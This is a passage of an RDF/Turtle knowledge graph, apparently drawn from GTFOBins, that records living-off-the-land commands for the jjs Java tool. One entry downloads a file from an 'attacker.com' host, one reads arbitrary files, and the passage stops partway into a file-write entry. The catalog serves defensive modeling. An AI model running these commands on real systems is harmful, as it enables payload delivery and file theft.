mknd:command_jjs-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "jjs-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request." ;
    d3f:uses mknd:executable_jjs ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_jjs ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
echo "var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();" | jjs
""" .

mknd:command_jjs-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "jjs-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_jjs ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_jjs ;
    mknd:provides mknd:function_file-read ;
    mknd:value """echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("file_to_read"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
""" .

mknd:command_jjs-file-write a d3f:Command,
